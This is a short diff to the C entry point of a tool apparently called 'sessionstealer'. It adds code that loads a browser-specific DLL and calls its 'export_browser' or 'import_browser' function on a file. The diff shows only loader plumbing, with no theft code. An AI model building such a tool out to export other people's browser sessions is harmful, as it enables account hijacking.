@@ -3,6 +3,7 @@
 #include "sessionstealer/utils.h"
 #include "sessionstealer/dll_loader.h"
 #include "dlls/discovery/discovery.h"
+#include "dlls/chromium/chromium.h"
 
 #include <stdlib.h>
 #include <stdio.h>
@@ -49,11 +50,17 @@ int main(int argc, char *argv[]) {
         printf("Dll for selected browser was not found, install %s\n", browser_map_dll[selected_browser->browser_name]);
         return EXIT_FAILURE;
     }
+    
     HMODULE hBrowserLib = LoadLibraryA(selected_browser_dll_name);
     if (!hBrowserLib) {
         printf("Couldnt load %s\n", selected_browser_dll_name);
         return EXIT_FAILURE;
     }
+    
+    const char *func_name = args.command == CLI_COMMAND_EXPORT ? "export_browser" : "import_browser";
+    browser_dll_fn browser_command = (browser_dll_fn)GetProcAddress(hBrowserLib, func_name);
 
-    return EXIT_SUCCESS;
+    int result = browser_command(selected_browser, args.file);
+
+    return result;
 }
